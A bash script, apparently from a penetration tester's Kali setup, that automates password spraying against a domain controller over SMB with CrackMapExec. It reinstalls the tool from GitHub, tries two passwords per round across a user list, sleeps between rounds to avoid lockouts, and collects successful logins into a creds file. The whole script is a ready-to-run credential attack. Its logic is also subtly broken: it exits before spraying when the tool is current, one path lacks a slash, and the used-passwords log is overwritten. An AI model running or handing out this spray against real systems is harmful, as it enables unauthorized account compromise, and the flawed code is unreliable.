#!/bin/bash

#usage : ./spraygun.sh dc-ip userlist.txt passwords.txt sleep-in-mins (2x per sleep) 

#script to auto-spray with cme

#add if loop to check for crackmapexec new (bane or 6.0)

# $1 - dc-ip
# $2 - user list
# $3 - password list
# $4 - sleep timer
# $5 - outlog file (not yet)


newest=6

current=$(crackmapexec | grep -ia 'version' | cut -d ':' -f 2 | cut -d '.' -f 1)

if [[ $current < $newest ]]; then
	  echo 'gotta update CME...please hold'
	  echo 'removing apt package and downloading current github'
	  cd /opt
	  apt remove crackmapexec
	  rm -rf /opt/CrackMapExec
	  apt install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
	  git clone https://github.com/mpgn/CrackMapExec
	  cd CrackMapExec
	  poetry install
	  echo 'running cme to see if its good to go'
	  poetry run crackmapexec
	  if poetry run crackmapexec | grep -ai "bane"; then
	    	echo "looks like we gucci"
	  else
	   	echo "might need to play with installing cme on your own, this failed"
	    	exit -1
	  fi
else
	  echo 'Current CME is good :)'
	  exit 0
fi

echo "sleeping for 10 sec incase you need to double check me"

#checking to make sure it installed goodly

sleep 10

#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

alias crackmapexec="poetry run crackmapexec"
sleep_timer="sleep $4m"
echo "sleep set to $4 mins.  Make sure this is good for sprays so no lockouts!"
echo "sleeping for 15 seconds to give you time to cancel if needed"

#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

sleep 15

#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


count=$(wc -l < $3)

while [ $count -gt 0 ]; do
	echo "Starting password spray with 2x every $4"
	
	head -n $count $3 > tmp.txt
	
	for pass in $(cat tmp.txt | head -2); do
		
		crackmapexec smb $1 -u $2 -p $pass --continue-on-success --log /home/kali/Documents/sprays/spraygun.txt
		echo $pass > /home/kali/Documents/sprays/used-passwords.txt

		sleep 10

	done
	
	echo "Found creds: "
	cat /home/kali/Documents/sprays/spraygun.txt | grep -ai '[+]' | tee -a home/kali/Documents/sprays/creds.txt
	
	sed -i "1,2d" $3
	
	count=$(wc -l < $3)
	$sleep_timer
done

echo "End of file, check your creds!"
